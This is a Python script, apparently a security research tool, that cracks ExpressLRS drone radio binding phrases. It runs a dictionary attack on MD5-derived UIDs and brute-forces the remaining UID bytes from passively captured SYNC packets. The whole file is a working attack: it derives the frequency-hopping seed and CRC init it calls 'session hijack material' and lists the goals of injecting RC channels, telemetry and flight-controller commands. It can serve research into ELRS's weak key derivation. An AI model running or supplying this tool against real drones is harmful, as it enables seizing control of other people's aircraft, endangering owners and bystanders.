#!/usr/bin/env python3
"""
ELRS Binding Phrase Cracker — dictionary + brute-force attack on binding phrase

Given observed SYNC identity bytes (UID[3:5] from passive capture or MSP
readout), recovers the binding phrase via:

  Phase 1 — Dictionary attack: hash every candidate phrase and compare
            UID[3:5] against the target. Near-instant for large wordlists.

  Phase 2 — Brute-force UID[0:2]: enumerate all 2^24 (~16.7M) possible
            UID[0:2] prefixes. This does NOT recover the binding phrase
            but produces every valid full 6-byte UID, which is sufficient
            to derive the FHSS seed and CRC init needed for session hijack.

Attack premise:
  ELRS derives the UID via MD5 of the binding phrase:
      MD5('-DMY_BINDING_PHRASE="<phrase>"')[0:6] → UID[0:5]
  UID[3], UID[4], UID[5] are transmitted in OTA SYNC packets (v3) and
  can be recovered passively. MD5 is not a KDF — there is no salt, no
  iteration count, no key stretching. A dictionary attack is trivially
  fast, and brute-forcing the remaining 3 unknown bytes (UID[0:2]) is
  ~16.7M MD5 hashes — under a second on any modern CPU.

Usage:
  # Dictionary attack against known target (TinyHawk UID[3:5]=11:18:5b)
  python3 elrs-binding-phrase-crack.py --target 11:18:5b

  # With external wordlist
  python3 elrs-binding-phrase-crack.py --target 11:18:5b -w rockyou.txt

  # Brute-force UID[0:2] to get full UID + FHSS/CRC material
  python3 elrs-binding-phrase-crack.py --target 11:18:5b --brute

  # Both phases
  python3 elrs-binding-phrase-crack.py --target 11:18:5b -w wordlist.txt --brute

  # Use 2-byte target (UID[4:5] only, OTA v4)
  python3 elrs-binding-phrase-crack.py --target 18:5b --brute

For authorized security research and CTF use only.
"""

import argparse
import hashlib
import json
import os
import struct
import sys
import time

_TOOLS_DIR = os.path.dirname(os.path.abspath(__file__))
if _TOOLS_DIR not in sys.path:
    sys.path.insert(0, _TOOLS_DIR)


DEFAULT_OTA_VERSION = 3


def phrase_to_uid(phrase: str) -> bytes:
    raw = f'-DMY_BINDING_PHRASE="{phrase}"'
    return hashlib.md5(raw.encode()).digest()[:6]


def uid_to_fhss_seed(uid: bytes, ota_ver: int = DEFAULT_OTA_VERSION) -> int:
    return (uid[2] << 24) | (uid[3] << 16) | (uid[4] << 8) | (uid[5] ^ ota_ver)


def uid_to_crc_init(uid: bytes, ota_ver: int = DEFAULT_OTA_VERSION) -> int:
    init = (uid[4] << 8) | uid[5]
    if ota_ver <= 3:
        return (init ^ ota_ver) & 0xFFFF
    return (init ^ (ota_ver << 8)) & 0xFFFF


def uid_hex(uid: bytes) -> str:
    return ":".join(f"{b:02x}" for b in uid)


def parse_target(target_str: str) -> bytes:
    parts = target_str.strip().upper().replace("-", ":").replace(" ", ":").split(":")
    if len(parts) not in (2, 3):
        raise ValueError(
            f"Target must be 2 bytes (UID[4:5]) or 3 bytes (UID[3:5]), got {len(parts)}"
        )
    return bytes(int(p, 16) for p in parts)


def load_builtin_phrases() -> list[str]:
    """Import the wordlist from the rainbow table generator."""
    try:
        rainbow_path = os.path.join(_TOOLS_DIR, "elrs-uid-rainbow.py")
        import importlib.util
        spec = importlib.util.spec_from_file_location("elrs_uid_rainbow", rainbow_path)
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        return list(mod.BUILTIN_PHRASES)
    except Exception:
        return []


def load_wordlist(path: str) -> list[str]:
    phrases = []
    with open(path, "r", errors="replace") as f:
        for line in f:
            phrases.append(line.rstrip("\n\r"))
    return phrases


def dictionary_attack(
    target: bytes, phrases: list[str], ota_ver: int, verbose: bool = False
) -> list[dict]:
    """Phase 1: hash each phrase and compare UID suffix against target."""
    matches = []
    target_len = len(target)
    checked = 0
    t0 = time.monotonic()

    for phrase in phrases:
        uid = phrase_to_uid(phrase)
        suffix = uid[6 - target_len : 6]
        checked += 1

        if suffix == target:
            entry = {
                "phrase": phrase,
                "uid": uid_hex(uid),
                "uid_bytes": list(uid),
                "fhss_seed": uid_to_fhss_seed(uid, ota_ver),
                "crc_init": uid_to_crc_init(uid, ota_ver),
            }
            matches.append(entry)
            if verbose:
                elapsed = time.monotonic() - t0
                print(
                    f"  [MATCH] phrase=\"{phrase}\" uid={uid_hex(uid)} "
                    f"fhss=0x{entry['fhss_seed']:08x} crc=0x{entry['crc_init']:04x} "
                    f"({checked} checked, {elapsed:.2f}s)"
                )

    elapsed = time.monotonic() - t0
    rate = checked / elapsed if elapsed > 0 else 0
    if verbose:
        print(f"  Dictionary: {checked} phrases in {elapsed:.3f}s ({rate:.0f}/s)")

    return matches


def bruteforce_uid_prefix(
    target: bytes, ota_ver: int, verbose: bool = False
) -> list[dict]:
    """Phase 2: enumerate all 2^24 UID[0:2] prefixes for the known suffix.

    This doesn't recover the phrase but produces every valid full 6-byte UID,
    which is sufficient to compute FHSS seed and CRC init for session hijack.
    """
    target_len = len(target)
    results = []
    t0 = time.monotonic()

    if target_len == 3:
        uid3, uid4, uid5 = target
    elif target_len == 2:
        uid4, uid5 = target
        uid3 = None
    else:
        raise ValueError("Target must be 2 or 3 bytes")

    total = 1 << 24 if uid3 is not None else 1 << 32
    if uid3 is None:
        # 4 unknown bytes — too large for simple brute force (~4B candidates).
        # With only 2-byte target, report what we can derive without full brute.
        if verbose:
            print("  2-byte target: CRC init is fully determined, FHSS seed "
                  "has 2^24 possibilities per UID[3] value (2^32 total).")
            print("  Enumerating representative UIDs for each UID[3] value...")

        # CRC init is fully determined by UID[4:5]
        crc = uid_to_crc_init(bytes([0, 0, 0, 0, uid4, uid5]), ota_ver)

        for uid3_candidate in range(256):
            uid = bytes([0, 0, 0, uid3_candidate, uid4, uid5])
            entry = {
                "uid_prefix_unknown": "00:00",
                "uid3": uid3_candidate,
                "uid_template": f"??:??:??:{uid3_candidate:02x}:{uid4:02x}:{uid5:02x}",
                "fhss_seed": uid_to_fhss_seed(uid, ota_ver),
                "crc_init": crc,
            }
            results.append(entry)

        elapsed = time.monotonic() - t0
        if verbose:
            print(f"  Generated 256 UID[3] templates in {elapsed:.3f}s")
            print(f"  CRC init (fixed): 0x{crc:04x}")
        return results

    # 3-byte target: only 2^24 = 16,777,216 candidates
    if verbose:
        print(f"  Brute-forcing UID[0:2] for target suffix "
              f"{uid3:02x}:{uid4:02x}:{uid5:02x}...")
        print(f"  Search space: {total:,} candidates")

    # Pre-compute the values we need
    fhss_base = (uid3 << 16) | (uid4 << 8) | (uid5 ^ ota_ver)
    crc = uid_to_crc_init(bytes([0, 0, 0, uid3, uid4, uid5]), ota_ver)

    report_interval = 1 << 22  # ~4M

    for prefix_int in range(total):
        b0 = (prefix_int >> 16) & 0xFF
        b1 = (prefix_int >> 8) & 0xFF
        b2 = prefix_int & 0xFF

        fhss_seed = (b2 << 24) | fhss_base

        if prefix_int > 0 and prefix_int % report_interval == 0 and verbose:
            elapsed = time.monotonic() - t0
            rate = prefix_int / elapsed
            pct = 100.0 * prefix_int / total
            eta = (total - prefix_int) / rate if rate > 0 else 0
            print(
                f"  ... {pct:.1f}% ({prefix_int:,}/{total:,}) "
                f"{rate:.0f}/s ETA {eta:.1f}s",
                end="\r",
            )

        results.append({
            "uid": f"{b0:02x}:{b1:02x}:{b2:02x}:{uid3:02x}:{uid4:02x}:{uid5:02x}",
            "uid_bytes": [b0, b1, b2, uid3, uid4, uid5],
            "fhss_seed": fhss_seed,
            "crc_init": crc,
        })

    elapsed = time.monotonic() - t0
    rate = total / elapsed if elapsed > 0 else 0
    if verbose:
        print(f"\n  Brute-force: {total:,} UIDs in {elapsed:.3f}s ({rate:.0f}/s)")
        print(f"  CRC init (fixed for this suffix): 0x{crc:04x}")
        print(f"  FHSS seeds: {total:,} unique values (one per UID[2])")

    return results


def derive_hijack_material(uid_bytes: list[int], ota_ver: int) -> dict:
    """Given a full 6-byte UID, derive everything needed for session hijack."""
    uid = bytes(uid_bytes)
    fhss_seed = uid_to_fhss_seed(uid, ota_ver)
    crc_init = uid_to_crc_init(uid, ota_ver)

    # FHSS sequence generation (simplified — matches ELRS FHSSrandomiseFHSSsequence)
    # The actual sequence uses the seed to generate a permutation of the
    # frequency hop table. We compute the seed; generating the full 240-hop
    # sequence would require porting the ELRS PRNG, which the companion
    # elrs-v3-fhss-check.py already does.
    return {
        "uid_hex": uid_hex(uid),
        "uid_bytes": list(uid),
        "fhss_seed": fhss_seed,
        "fhss_seed_hex": f"0x{fhss_seed:08x}",
        "crc_init": crc_init,
        "crc_init_hex": f"0x{crc_init:04x}",
        "ota_version": ota_ver,
        "attack_capabilities": [
            "FHSS sequence prediction (hop-by-hop tracking)",
            "CRC validation bypass (forge valid packets)",
            "RC channel injection (if TX is jammed/absent)",
            "Telemetry injection (fake sensor data to TX)",
            "MSP-over-CRSF command injection (FC control)",
        ],
    }


def main():
    parser = argparse.ArgumentParser(
        description="ELRS Binding Phrase Cracker — dictionary + brute-force"
    )
    parser.add_argument(
        "--target", required=True,
        help="Target SYNC identity bytes (hex, colon-separated). "
             "3 bytes = UID[3]:UID[4]:UID[5] (OTA v3), "
             "2 bytes = UID[4]:UID[5] (OTA v4 or partial recovery)",
    )
    parser.add_argument(
        "-w", "--wordlist",
        help="External wordlist file (one phrase per line)",
    )
    parser.add_argument(
        "--no-builtin", action="store_true",
        help="Skip built-in FPV/ELRS phrase dictionary",
    )
    parser.add_argument(
        "--brute", action="store_true",
        help="Phase 2: brute-force UID[0:2] prefix (16.7M candidates)",
    )
    parser.add_argument(
        "--ota-version", type=int, default=DEFAULT_OTA_VERSION, choices=[3, 4],
        help="OTA version ID (default: %(default)s)",
    )
    parser.add_argument(
        "-o", "--output",
        help="Output JSON file for results",
    )
    parser.add_argument(
        "--brute-output",
        help="Output JSON file for brute-force UID enumeration (can be large)",
    )
    parser.add_argument(
        "-v", "--verbose", action="store_true",
        help="Verbose output",
    )
    args = parser.parse_args()

    target = parse_target(args.target)
    ota_ver = args.ota_version
    target_hex = ":".join(f"{b:02x}" for b in target)

    print(f"ELRS Binding Phrase Cracker")
    print(f"Target SYNC bytes: {target_hex}")
    print(f"Target length:     {len(target)} bytes ({'UID[3:5]' if len(target) == 3 else 'UID[4:5]'})")
    print(f"OTA version:       {ota_ver}")
    print()

    results = {
        "target": target_hex,
        "target_bytes": list(target),
        "ota_version": ota_ver,
        "no_phrase_match": None,
        "dictionary_matches": [],
        "brute_force_summary": None,
    }

    # --- Phase 0: No binding phrase / firmware defaults ---
    # ELRS has two "no binding phrase" cases:
    #   1. Phrase field left empty → MD5('-DMY_BINDING_PHRASE=""')[0:6]
    #   2. MY_BINDING_PHRASE not defined at all → hardcoded UID
    #      (common_defs.h: MY_UID defaults to 0,0,1,2,3,4,5,6)
    # RTF/BNF drones and pre-bound kits often ship with no phrase set.
    print("Phase 0: Checking no-binding-phrase / firmware defaults")
    no_phrase_candidates = [
        ("Empty phrase (field left blank)", phrase_to_uid("")),
        ("ELRS default MY_UID (no phrase compiled)", bytes([0, 0, 1, 2, 3, 4])),
        ("Betaflight unbound default (all zeros)", bytes([0, 0, 0, 0, 0, 0])),
    ]
    no_phrase_hit = False
    target_len = len(target)
    for desc, uid in no_phrase_candidates:
        suffix = uid[6 - target_len : 6]
        match = suffix == target
        status = "MATCH" if match else "no"
        print(f"  {desc:50s} → [{':'.join(f'{b:02x}' for b in suffix)}] {status}")
        if match:
            no_phrase_hit = True
            entry = {
                "description": desc,
                "uid": uid_hex(uid),
                "uid_bytes": list(uid),
                "fhss_seed": uid_to_fhss_seed(uid, ota_ver),
                "crc_init": uid_to_crc_init(uid, ota_ver),
            }
            results["no_phrase_match"] = entry
            print(f"\n  {'=' * 60}")
            print(f"  NO BINDING PHRASE — target is using firmware defaults!")
            print(f"  {'=' * 60}")
            print(f"  UID:       {uid_hex(uid)}")
            print(f"  FHSS seed: 0x{entry['fhss_seed']:08x}")
            print(f"  CRC init:  0x{entry['crc_init']:04x}")
            print(f"\n  This means the target has NO cryptographic binding.")
            print(f"  Full hijack material is trivially known.\n")
    if not no_phrase_hit:
        print("  No firmware-default match — target has a custom binding phrase.\n")

    # --- Phase 1: Dictionary Attack ---
    phrases = []
    if not args.no_builtin:
        builtin = load_builtin_phrases()
        phrases.extend(builtin)
        print(f"Phase 1: Dictionary attack ({len(builtin)} built-in phrases", end="")
    if args.wordlist:
        external = load_wordlist(args.wordlist)
        phrases.extend(external)
        print(f" + {len(external)} from {args.wordlist}", end="")

    # Deduplicate
    seen = set()
    unique = []
    for p in phrases:
        if p not in seen:
            seen.add(p)
            unique.append(p)
    phrases = unique

    if phrases:
        if not args.no_builtin or args.wordlist:
            print(f", {len(phrases)} unique)")
        matches = dictionary_attack(target, phrases, ota_ver, verbose=True)
        results["dictionary_matches"] = matches

        if matches:
            print(f"\n{'=' * 70}")
            print(f"DICTIONARY HIT — {len(matches)} match(es) found!")
            print(f"{'=' * 70}")
            for m in matches:
                print(f"\n  Binding phrase: \"{m['phrase']}\"")
                print(f"  Full UID:       {m['uid']}")
                print(f"  FHSS seed:      0x{m['fhss_seed']:08x}")
                print(f"  CRC init:       0x{m['crc_init']:04x}")

                hijack = derive_hijack_material(m["uid_bytes"], ota_ver)
                print(f"\n  Hijack capabilities with this material:")
                for cap in hijack["attack_capabilities"]:
                    print(f"    - {cap}")
            print()
        else:
            print("\n  No dictionary matches — phrase is not in wordlist.")
            print("  Proceeding to brute-force if --brute was specified.\n")
    else:
        print("Phase 1: Skipped (no wordlist loaded)\n")

    # --- Phase 2: Brute-force UID[0:2] ---
    if args.brute:
        print(f"Phase 2: Brute-force UID prefix enumeration")
        if len(target) == 3:
            print(f"  Known:   UID[3:5] = {target_hex}")
            print(f"  Unknown: UID[0:2] = 3 bytes = 16,777,216 candidates")
            print(f"  CRC init is fully determined by UID[4:5] alone")
            print(f"  FHSS seed varies with UID[2] (256 unique seeds)")
            print()

            bf_results = bruteforce_uid_prefix(target, ota_ver, verbose=True)

            # Summary statistics
            unique_seeds = len(set(r["fhss_seed"] for r in bf_results))
            crc = bf_results[0]["crc_init"] if bf_results else 0

            summary = {
                "total_uids": len(bf_results),
                "unique_fhss_seeds": unique_seeds,
                "crc_init": crc,
                "crc_init_hex": f"0x{crc:04x}",
                "note": (
                    "CRC init is fixed for the known UID[4:5]. "
                    f"FHSS seed has {unique_seeds} possible values "
                    "(one per UID[2] byte). To narrow to the single correct "
                    "FHSS seed, observe 2+ consecutive hop frequencies."
                ),
            }
            results["brute_force_summary"] = summary

            print(f"\n{'=' * 70}")
            print(f"BRUTE-FORCE COMPLETE")
            print(f"{'=' * 70}")
            print(f"  Total valid UIDs:    {len(bf_results):,}")
            print(f"  Unique FHSS seeds:   {unique_seeds}")
            print(f"  CRC init (fixed):    0x{crc:04x}")
            print(f"\n  Key insight: CRC init is KNOWN — only 256 FHSS seeds")
            print(f"  to try. With 2 observed hop frequencies, the correct")
            print(f"  seed can be identified, completing the hijack material.")

            if args.brute_output:
                with open(args.brute_output, "w") as f:
                    json.dump({
                        "target": target_hex,
                        "ota_version": ota_ver,
                        "uids": bf_results[:1000],
                        "total": len(bf_results),
                        "truncated": len(bf_results) > 1000,
                        "summary": summary,
                    }, f, indent=2)
                print(f"\n  Brute-force UIDs written to {args.brute_output}")
                print(f"  (first 1000 of {len(bf_results):,} shown)")

        elif len(target) == 2:
            print(f"  Known:   UID[4:5] = {target_hex}")
            print(f"  Unknown: UID[0:3] = 4 bytes = 4,294,967,296 candidates")
            print(f"  CRC init is fully determined by UID[4:5] alone")
            print()

            bf_results = bruteforce_uid_prefix(target, ota_ver, verbose=True)
            crc = bf_results[0]["crc_init"] if bf_results else 0

            summary = {
                "total_uid3_templates": len(bf_results),
                "crc_init": crc,
                "crc_init_hex": f"0x{crc:04x}",
                "note": (
                    "With only 2 known bytes, CRC init is still determined. "
                    "FHSS seed has 2^24 possibilities per UID[3] value. "
                    "Upgrade to 3-byte capture (OTA v3 SYNC) for tractable "
                    "brute-force."
                ),
            }
            results["brute_force_summary"] = summary

            print(f"\n  CRC init (fixed): 0x{crc:04x}")
            print(f"  FHSS seed space: 2^32 per UID[3] — consider upgrading")
            print(f"  to 3-byte capture for tractable enumeration.")

    # --- Output ---
    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        print(f"\nResults written to {args.output}")

    # --- Final assessment ---
    print(f"\n{'=' * 70}")
    print("ASSESSMENT")
    print(f"{'=' * 70}")

    if results["dictionary_matches"]:
        print(f"  CRITICAL: Binding phrase recovered via dictionary attack.")
        print(f"  Full session hijack material is available.")
        print(f"  Attack requires: passive RF capture OR MSP readout (already done)")
        print(f"  No hardware needed beyond what produced the UID[3:5] capture.")
    elif args.brute and len(target) == 3:
        print(f"  HIGH: Binding phrase not in dictionary, but full UID space")
        print(f"  is enumerated. CRC init is KNOWN. Only 256 candidate FHSS")
        print(f"  seeds need testing — observing 2 consecutive hops narrows")
        print(f"  to a single seed, completing hijack material.")
        print(f"\n  Next step: passive FHSS hop observation to resolve UID[2].")
    elif args.brute and len(target) == 2:
        print(f"  MEDIUM: CRC init is known but FHSS seed space is too large")
        print(f"  for blind brute-force. Capture 3-byte SYNC (OTA v3) to")
        print(f"  reduce to the tractable 256-seed case.")
    else:
        print(f"  No matches. Run with --brute and/or larger wordlist (-w).")

    return 0 if results["dictionary_matches"] else 1


if __name__ == "__main__":
    sys.exit(main())
